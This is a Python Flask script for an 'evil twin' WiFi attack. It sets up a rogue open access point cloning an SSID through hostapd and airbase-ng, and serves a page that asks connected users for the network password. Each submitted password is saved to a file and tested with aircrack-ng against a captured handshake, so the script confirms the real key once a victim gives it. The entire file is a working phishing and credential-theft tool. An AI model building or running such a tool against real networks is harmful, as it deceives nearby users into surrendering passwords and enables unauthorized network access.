import os
import subprocess
import time
import signal
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Set the desired WiFi SSID and channel
WiFi_SSID = "TestNetwork"
WiFi_CHANNEL = "6"

# Set the IP address and subnet mask for wlan1
wlan1_ip = "192.168.4.2"
subnet_mask = "255.255.255.0"

# Path to the hostapd configuration file
hostapd_conf_path = "EvilTwinhostapd.conf"

# Create hostapd configuration content
hostapd_config = '''interface=wlan1
driver=nl80211
ssid={}
hw_mode=g
channel={}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
'''.format(WiFi_SSID, WiFi_CHANNEL)

# Write the hostapd configuration to a file
with open(hostapd_conf_path, "w") as conf_file:
    conf_file.write(hostapd_config)

# Set IP address and subnet mask for wlan1
subprocess.call(["sudo", "ifconfig", "wlan1", wlan1_ip, "netmask", subnet_mask])

# Start hostapd using subprocess
hostapd_process = subprocess.Popen(["sudo", "hostapd", hostapd_conf_path])

# Wait for hostapd to initialize before starting airbase-ng
time.sleep(5)

# Start airbase-ng using subprocess
airbase_process = subprocess.Popen(["sudo", "airbase-ng", "-e", WiFi_SSID, "-c", WiFi_CHANNEL, "wlan1"])

def cleanup_processes(signum=None, frame=None):
    # Terminate both hostapd and airbase-ng processes
    if hostapd_process.poll() is None:  # Check if process is still running
        hostapd_process.terminate()
    if airbase_process.poll() is None:  # Check if process is still running
        airbase_process.terminate()
    print("Processes terminated.")

# Attach the cleanup function to SIGINT and SIGTERM signals
signal.signal(signal.SIGINT, cleanup_processes)
signal.signal(signal.SIGTERM, cleanup_processes)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/check_password', methods=['POST'])
def check_password():
    user_input = request.json['password']

    # Save user input to the file
    with open("output.txt", "w") as file:
        file.write(user_input)

    # Placeholder for the aircrack-ng command (replace this with your actual command)
    aircrack_command = ["aircrack-ng", "WiFiNetwork-01.cap", "-w", "output.txt"]
                                                 
    # Run the aircrack-ng command
    aircrack_result = subprocess.Popen(aircrack_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = aircrack_result.communicate()

    # Check the output for the correct password
    if "KEY FOUND" in stdout:
        message = "Correct password :D"
    else:
        message = "Incorrect password! Please try again."

    return jsonify({'message': message})

if __name__ == "__main__":
    try:
        app.run(host='0.0.0.0', port=80, debug=True)
    finally:
        # Ensure to terminate both hostapd and airbase-ng processes when the Flask app exits
        cleanup_processes()
